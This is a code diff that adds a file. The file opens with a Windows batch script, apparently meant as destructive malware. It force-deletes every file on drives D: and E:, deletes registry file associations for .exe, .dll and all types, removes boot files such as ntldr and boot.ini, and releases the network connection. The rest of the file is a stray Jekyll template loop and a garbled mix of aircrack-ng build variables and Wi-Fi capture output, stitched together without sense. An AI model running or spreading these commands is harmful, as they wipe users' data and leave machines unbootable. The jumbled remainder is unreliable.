@@ -1,0 +1,69 @@
+@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+
+{
+REGISTARY:
+
+@ECHO OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+
+
+CRASH:
+
+@echo off
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+
+
+
+STOP Internet:
+
+@Echo off
+Ipconfig /release
+
+
+
+}
+
+{% for post in site.categories. %}
+{{ post.title }} {{ post.date | date: "%B %d, %Y" }}
+{% endfor %}
+
+{
+
+LIB_AIR_CRACK_CRYPTO_X32_SSE2 = aircrack-crypto/libaircrack-crypto-x86-sse2.la
+LIB_AIR_CRACK_CRYPTO_X64_SSE2_EXE = -Laircrack-crypto -laircrack-crypto-x86-sse2
+Sbin_PROGRAMS = airbase-ng \
+                aireplay-ng \
+                airodump-ng \
+                airserv-ng \
+                airtun-ng\
+                aircon-ng\
+                airprop-ng\
+                airdec-ng\
+               airvers-ng\
+               Opening psk-01.cap
+ Opening psk-02.cap
+ Opening psk-03.cap
+ Opening psk-04.cap
+ Read 1827 packets.
+
+
+LIB_AIR_CRACK_CRYPTO_WIN10/XP/N/8.1;
+
+LIB_AIR_CRACK_CRYPTO_LINUX/UBUNTU;
+
+LIB_AIR_CRACK_CRPTO_KALI LINUX/RUBY;
+
+}
+
+}
